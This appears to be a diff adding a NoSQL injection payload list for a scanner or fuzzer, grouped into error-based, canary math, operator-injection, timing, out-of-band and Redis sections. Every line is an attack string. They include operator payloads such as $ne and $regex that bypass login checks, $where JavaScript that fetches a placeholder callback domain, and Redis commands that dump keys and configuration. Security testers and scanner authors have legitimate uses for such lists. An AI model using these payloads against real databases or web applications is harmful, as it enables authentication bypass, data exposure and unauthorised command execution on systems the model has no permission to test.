@@ -1,0 +1,32 @@
+##NoSQL - Error-Based##
+{$gt:""}
+'"\/$[].>
+##NoSQL - Math-Based (Canary: 1337)##
+{"$expr":{"$literal":1337}}
+[$where]=return 7*191
+true, $where: 'return 7*191'
+##NoSQL - Operator Injection##
+{"$ne":null}
+{"$exists":true}
+{"$and":[{"$ne":null}]}
+[$ne]=1
+[$gt]=
+[$regex]=.*
+[$exists]=true
+[$in][]=admin
+$ne[]=1
+$gt=
+$regex=.*
+##NoSQL - Timing-Based##
+[$where]=sleep(5000)
+##NoSQL - OOB##
+{"$where":"this.a==1||new Function('return fetch(\"http://{domain}/nosql\")')()"}
+[$where]=fetch('http://{domain}/nosql')
+##NoSQL - Redis##
+EVAL "return 7*191" 0
+EVAL "redis.call('SET','test','1337')" 0
+DEBUG SLEEP 5
+SET test 1337
+CONFIG GET *
+INFO
+KEYS *
